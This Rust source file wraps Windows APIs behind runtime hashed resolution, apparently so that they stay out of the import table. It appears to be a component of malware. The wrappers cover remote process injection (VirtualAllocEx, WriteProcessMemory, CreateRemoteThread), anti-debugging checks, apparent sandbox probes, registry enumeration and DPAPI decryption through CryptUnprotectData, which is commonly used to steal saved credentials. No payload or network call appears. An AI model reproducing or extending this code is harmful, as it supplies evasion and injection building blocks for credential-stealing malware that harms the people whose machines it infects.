use std::ffi::c_void;

pub struct HashedAPIs;

impl HashedAPIs {
    #[inline(always)]
    pub unsafe fn virtual_alloc_ex(
        process: *mut c_void,
        address: *mut c_void,
        size: usize,
        alloc_type: u32,
        protect: u32,
    ) -> *mut c_void {
        type VirtualAllocExFn = unsafe extern "system" fn(
            *mut c_void,
            *mut c_void,
            usize,
            u32,
            u32,
        ) -> *mut c_void;

        let func_ptr = crate::api_resolve!("KERNEL32.DLL", "VirtualAllocEx");
        let func: VirtualAllocExFn = std::mem::transmute(func_ptr);
        func(process, address, size, alloc_type, protect)
    }

    #[inline(always)]
    pub unsafe fn write_process_memory(
        process: *mut c_void,
        base_address: *mut c_void,
        buffer: *const c_void,
        size: usize,
        bytes_written: *mut usize,
    ) -> i32 {
        type WriteProcessMemoryFn = unsafe extern "system" fn(
            *mut c_void,
            *mut c_void,
            *const c_void,
            usize,
            *mut usize,
        ) -> i32;

        let func_ptr = crate::api_resolve!("KERNEL32.DLL", "WriteProcessMemory");
        let func: WriteProcessMemoryFn = std::mem::transmute(func_ptr);
        func(process, base_address, buffer, size, bytes_written)
    }

    #[inline(always)]
    pub unsafe fn create_remote_thread(
        process: *mut c_void,
        thread_attributes: *mut c_void,
        stack_size: usize,
        start_address: *mut c_void,
        parameter: *mut c_void,
        creation_flags: u32,
        thread_id: *mut u32,
    ) -> *mut c_void {
        type CreateRemoteThreadFn = unsafe extern "system" fn(
            *mut c_void,
            *mut c_void,
            usize,
            *mut c_void,
            *mut c_void,
            u32,
            *mut u32,
        ) -> *mut c_void;

        let func_ptr = crate::api_resolve!("KERNEL32.DLL", "CreateRemoteThread");
        let func: CreateRemoteThreadFn = std::mem::transmute(func_ptr);
        func(process, thread_attributes, stack_size, start_address, parameter, creation_flags, thread_id)
    }

    #[inline(always)]
    pub unsafe fn open_process(
        desired_access: u32,
        inherit_handle: i32,
        process_id: u32,
    ) -> *mut c_void {
        type OpenProcessFn = unsafe extern "system" fn(u32, i32, u32) -> *mut c_void;

        let func_ptr = crate::api_resolve!("KERNEL32.DLL", "OpenProcess");
        let func: OpenProcessFn = std::mem::transmute(func_ptr);
        func(desired_access, inherit_handle, process_id)
    }

    #[inline(always)]
    pub unsafe fn create_process_w(
        application_name: *const u16,
        command_line: *mut u16,
        process_attributes: *mut c_void,
        thread_attributes: *mut c_void,
        inherit_handles: i32,
        creation_flags: u32,
        environment: *mut c_void,
        current_directory: *const u16,
        startup_info: *mut c_void,
        process_info: *mut c_void,
    ) -> i32 {
        type CreateProcessWFn = unsafe extern "system" fn(
            *const u16,
            *mut u16,
            *mut c_void,
            *mut c_void,
            i32,
            u32,
            *mut c_void,
            *const u16,
            *mut c_void,
            *mut c_void,
        ) -> i32;

        let func_ptr = crate::api_resolve!("KERNEL32.DLL", "CreateProcessW");
        let func: CreateProcessWFn = std::mem::transmute(func_ptr);
        func(
            application_name,
            command_line,
            process_attributes,
            thread_attributes,
            inherit_handles,
            creation_flags,
            environment,
            current_directory,
            startup_info,
            process_info,
        )
    }

    #[inline(always)]
    pub unsafe fn load_library_a(filename: *const i8) -> *mut c_void {
        type LoadLibraryAFn = unsafe extern "system" fn(*const i8) -> *mut c_void;

        let func_ptr = crate::api_resolve!("KERNEL32.DLL", "LoadLibraryA");
        let func: LoadLibraryAFn = std::mem::transmute(func_ptr);
        func(filename)
    }

    #[inline(always)]
    pub unsafe fn get_proc_address(module: *mut c_void, proc_name: *const i8) -> *mut c_void {
        type GetProcAddressFn = unsafe extern "system" fn(*mut c_void, *const i8) -> *mut c_void;

        let func_ptr = crate::api_resolve!("KERNEL32.DLL", "GetProcAddress");
        let func: GetProcAddressFn = std::mem::transmute(func_ptr);
        func(module, proc_name)
    }

    #[inline(always)]
    pub unsafe fn virtual_protect_ex(
        process: *mut c_void,
        address: *mut c_void,
        size: usize,
        new_protect: u32,
        old_protect: *mut u32,
    ) -> i32 {
        type VirtualProtectExFn = unsafe extern "system" fn(
            *mut c_void,
            *mut c_void,
            usize,
            u32,
            *mut u32,
        ) -> i32;

        let func_ptr = crate::api_resolve!("KERNEL32.DLL", "VirtualProtectEx");
        let func: VirtualProtectExFn = std::mem::transmute(func_ptr);
        func(process, address, size, new_protect, old_protect)
    }

    #[inline(always)]
    pub unsafe fn create_mutex_w(
        mutex_attributes: *mut c_void,
        initial_owner: i32,
        name: *const u16,
    ) -> *mut c_void {
        type CreateMutexWFn = unsafe extern "system" fn(*mut c_void, i32, *const u16) -> *mut c_void;

        let func_ptr = crate::api_resolve!("KERNEL32.DLL", "CreateMutexW");
        let func: CreateMutexWFn = std::mem::transmute(func_ptr);
        func(mutex_attributes, initial_owner, name)
    }

    #[inline(always)]
    pub unsafe fn open_mutex_w(
        desired_access: u32,
        inherit_handle: i32,
        name: *const u16,
    ) -> *mut c_void {
        type OpenMutexWFn = unsafe extern "system" fn(u32, i32, *const u16) -> *mut c_void;

        let func_ptr = crate::api_resolve!("KERNEL32.DLL", "OpenMutexW");
        let func: OpenMutexWFn = std::mem::transmute(func_ptr);
        func(desired_access, inherit_handle, name)
    }

    #[inline(always)]
    pub unsafe fn release_mutex(mutex: *mut c_void) -> i32 {
        type ReleaseMutexFn = unsafe extern "system" fn(*mut c_void) -> i32;

        let func_ptr = crate::api_resolve!("KERNEL32.DLL", "ReleaseMutex");
        let func: ReleaseMutexFn = std::mem::transmute(func_ptr);
        func(mutex)
    }

    #[inline(always)]
    pub unsafe fn close_handle(handle: *mut c_void) -> i32 {
        type CloseHandleFn = unsafe extern "system" fn(*mut c_void) -> i32;

        let func_ptr = crate::api_resolve!("KERNEL32.DLL", "CloseHandle");
        let func: CloseHandleFn = std::mem::transmute(func_ptr);
        func(handle)
    }

    #[inline(always)]
    pub unsafe fn get_last_error() -> u32 {
        type GetLastErrorFn = unsafe extern "system" fn() -> u32;

        let func_ptr = crate::api_resolve!("KERNEL32.DLL", "GetLastError");
        let func: GetLastErrorFn = std::mem::transmute(func_ptr);
        func()
    }

    #[inline(always)]
    pub unsafe fn terminate_process(
        process: *mut c_void,
        exit_code: u32,
    ) -> i32 {
        type TerminateProcessFn = unsafe extern "system" fn(*mut c_void, u32) -> i32;

        let func_ptr = crate::api_resolve!("KERNEL32.DLL", "TerminateProcess");
        let func: TerminateProcessFn = std::mem::transmute(func_ptr);
        func(process, exit_code)
    }

    #[inline(always)]
    pub unsafe fn create_toolhelp32_snapshot(
        flags: u32,
        process_id: u32,
    ) -> *mut c_void {
        type CreateToolhelp32SnapshotFn = unsafe extern "system" fn(u32, u32) -> *mut c_void;

        let func_ptr = crate::api_resolve!("KERNEL32.DLL", "CreateToolhelp32Snapshot");
        let func: CreateToolhelp32SnapshotFn = std::mem::transmute(func_ptr);
        func(flags, process_id)
    }

    #[inline(always)]
    pub unsafe fn process32_first_w(
        snapshot: *mut c_void,
        process_entry: *mut c_void,
    ) -> i32 {
        type Process32FirstWFn = unsafe extern "system" fn(*mut c_void, *mut c_void) -> i32;

        let func_ptr = crate::api_resolve!("KERNEL32.DLL", "Process32FirstW");
        let func: Process32FirstWFn = std::mem::transmute(func_ptr);
        func(snapshot, process_entry)
    }

    #[inline(always)]
    pub unsafe fn process32_next_w(
        snapshot: *mut c_void,
        process_entry: *mut c_void,
    ) -> i32 {
        type Process32NextWFn = unsafe extern "system" fn(*mut c_void, *mut c_void) -> i32;

        let func_ptr = crate::api_resolve!("KERNEL32.DLL", "Process32NextW");
        let func: Process32NextWFn = std::mem::transmute(func_ptr);
        func(snapshot, process_entry)
    }

    #[inline(always)]
    pub unsafe fn is_debugger_present() -> i32 {
        type IsDebuggerPresentFn = unsafe extern "system" fn() -> i32;

        let func_ptr = crate::api_resolve!("KERNEL32.DLL", "IsDebuggerPresent");
        let func: IsDebuggerPresentFn = std::mem::transmute(func_ptr);
        func()
    }

    #[inline(always)]
    pub unsafe fn check_remote_debugger_present(
        process: *mut c_void,
        debugger_present: *mut i32,
    ) -> i32 {
        type CheckRemoteDebuggerPresentFn = unsafe extern "system" fn(*mut c_void, *mut i32) -> i32;

        let func_ptr = crate::api_resolve!("KERNEL32.DLL", "CheckRemoteDebuggerPresent");
        let func: CheckRemoteDebuggerPresentFn = std::mem::transmute(func_ptr);
        func(process, debugger_present)
    }

    #[inline(always)]
    pub unsafe fn get_current_process() -> *mut c_void {
        type GetCurrentProcessFn = unsafe extern "system" fn() -> *mut c_void;

        let func_ptr = crate::api_resolve!("KERNEL32.DLL", "GetCurrentProcess");
        let func: GetCurrentProcessFn = std::mem::transmute(func_ptr);
        func()
    }

    #[inline(always)]
    pub unsafe fn get_module_file_name_w(
        module: *mut c_void,
        filename: *mut u16,
        size: u32,
    ) -> u32 {
        type GetModuleFileNameWFn = unsafe extern "system" fn(*mut c_void, *mut u16, u32) -> u32;

        let func_ptr = crate::api_resolve!("KERNEL32.DLL", "GetModuleFileNameW");
        let func: GetModuleFileNameWFn = std::mem::transmute(func_ptr);
        func(module, filename, size)
    }

    #[inline(always)]
    pub unsafe fn get_module_handle_w(module_name: *const u16) -> *mut c_void {
        type GetModuleHandleWFn = unsafe extern "system" fn(*const u16) -> *mut c_void;

        let func_ptr = crate::api_resolve!("KERNEL32.DLL", "GetModuleHandleW");
        let func: GetModuleHandleWFn = std::mem::transmute(func_ptr);
        func(module_name)
    }

    #[inline(always)]
    pub unsafe fn get_current_process_id() -> u32 {
        type GetCurrentProcessIdFn = unsafe extern "system" fn() -> u32;

        let func_ptr = crate::api_resolve!("KERNEL32.DLL", "GetCurrentProcessId");
        let func: GetCurrentProcessIdFn = std::mem::transmute(func_ptr);
        func()
    }

    #[inline(always)]
    pub unsafe fn get_tick_count_64() -> u64 {
        type GetTickCount64Fn = unsafe extern "system" fn() -> u64;

        let func_ptr = crate::api_resolve!("KERNEL32.DLL", "GetTickCount64");
        let func: GetTickCount64Fn = std::mem::transmute(func_ptr);
        func()
    }

    #[inline(always)]
    pub unsafe fn sleep(milliseconds: u32) {
        type SleepFn = unsafe extern "system" fn(u32);

        let func_ptr = crate::api_resolve!("KERNEL32.DLL", "Sleep");
        let func: SleepFn = std::mem::transmute(func_ptr);
        func(milliseconds)
    }

    #[inline(always)]
    pub unsafe fn get_system_info(system_info: *mut std::ffi::c_void) {
        type GetSystemInfoFn = unsafe extern "system" fn(*mut std::ffi::c_void);

        let func_ptr = crate::api_resolve!("KERNEL32.DLL", "GetSystemInfo");
        let func: GetSystemInfoFn = std::mem::transmute(func_ptr);
        func(system_info)
    }

    #[inline(always)]
    pub unsafe fn global_memory_status_ex(buffer: *mut std::ffi::c_void) -> i32 {
        type GlobalMemoryStatusExFn = unsafe extern "system" fn(*mut std::ffi::c_void) -> i32;

        let func_ptr = crate::api_resolve!("KERNEL32.DLL", "GlobalMemoryStatusEx");
        let func: GlobalMemoryStatusExFn = std::mem::transmute(func_ptr);
        func(buffer)
    }

    #[inline(always)]
    pub unsafe fn get_final_path_name_by_handle_w(
        handle: *mut c_void,
        path: *mut u16,
        path_len: u32,
        flags: u32,
    ) -> u32 {
        type GetFinalPathNameByHandleWFn = unsafe extern "system" fn(*mut c_void, *mut u16, u32, u32) -> u32;

        let func_ptr = crate::api_resolve!("KERNEL32.DLL", "GetFinalPathNameByHandleW");
        let func: GetFinalPathNameByHandleWFn = std::mem::transmute(func_ptr);
        func(handle, path, path_len, flags)
    }

    // ========== REGISTRY APIs (ADVAPI32.DLL) ==========

    #[inline(always)]
    pub unsafe fn reg_open_key_ex_w(
        key: *mut c_void,
        sub_key: *const u16,
        options: u32,
        desired: u32,
        result: *mut *mut c_void,
    ) -> i32 {
        type RegOpenKeyExWFn = unsafe extern "system" fn(*mut c_void, *const u16, u32, u32, *mut *mut c_void) -> i32;

        let func_ptr = crate::api_resolve!("ADVAPI32.DLL", "RegOpenKeyExW");
        let func: RegOpenKeyExWFn = std::mem::transmute(func_ptr);
        func(key, sub_key, options, desired, result)
    }

    #[inline(always)]
    pub unsafe fn reg_query_value_ex_w(
        key: *mut c_void,
        value_name: *const u16,
        reserved: *mut u32,
        type_: *mut u32,
        data: *mut u8,
        data_len: *mut u32,
    ) -> i32 {
        type RegQueryValueExWFn = unsafe extern "system" fn(*mut c_void, *const u16, *mut u32, *mut u32, *mut u8, *mut u32) -> i32;

        let func_ptr = crate::api_resolve!("ADVAPI32.DLL", "RegQueryValueExW");
        let func: RegQueryValueExWFn = std::mem::transmute(func_ptr);
        func(key, value_name, reserved, type_, data, data_len)
    }

    #[inline(always)]
    pub unsafe fn reg_enum_key_ex_w(
        key: *mut c_void,
        index: u32,
        name: *mut u16,
        name_len: *mut u32,
        reserved: *mut u32,
        class: *mut u16,
        class_len: *mut u32,
        last_write_time: *mut c_void,
    ) -> i32 {
        type RegEnumKeyExWFn = unsafe extern "system" fn(*mut c_void, u32, *mut u16, *mut u32, *mut u32, *mut u16, *mut u32, *mut c_void) -> i32;

        let func_ptr = crate::api_resolve!("ADVAPI32.DLL", "RegEnumKeyExW");
        let func: RegEnumKeyExWFn = std::mem::transmute(func_ptr);
        func(key, index, name, name_len, reserved, class, class_len, last_write_time)
    }

    #[inline(always)]
    pub unsafe fn reg_close_key(key: *mut c_void) -> i32 {
        type RegCloseKeyFn = unsafe extern "system" fn(*mut c_void) -> i32;

        let func_ptr = crate::api_resolve!("ADVAPI32.DLL", "RegCloseKey");
        let func: RegCloseKeyFn = std::mem::transmute(func_ptr);
        func(key)
    }

    // ========== CRYPTO APIs (CRYPT32.DLL) ==========

    #[inline(always)]
    pub unsafe fn crypt_unprotect_data(
        data_in: *mut c_void,
        description: *mut *mut u16,
        optional_entropy: *mut c_void,
        reserved: *mut c_void,
        prompt_struct: *mut c_void,
        flags: u32,
        data_out: *mut c_void,
    ) -> i32 {
        type CryptUnprotectDataFn = unsafe extern "system" fn(*mut c_void, *mut *mut u16, *mut c_void, *mut c_void, *mut c_void, u32, *mut c_void) -> i32;

        let func_ptr = crate::api_resolve!("CRYPT32.DLL", "CryptUnprotectData");
        let func: CryptUnprotectDataFn = std::mem::transmute(func_ptr);
        func(data_in, description, optional_entropy, reserved, prompt_struct, flags, data_out)
    }
}
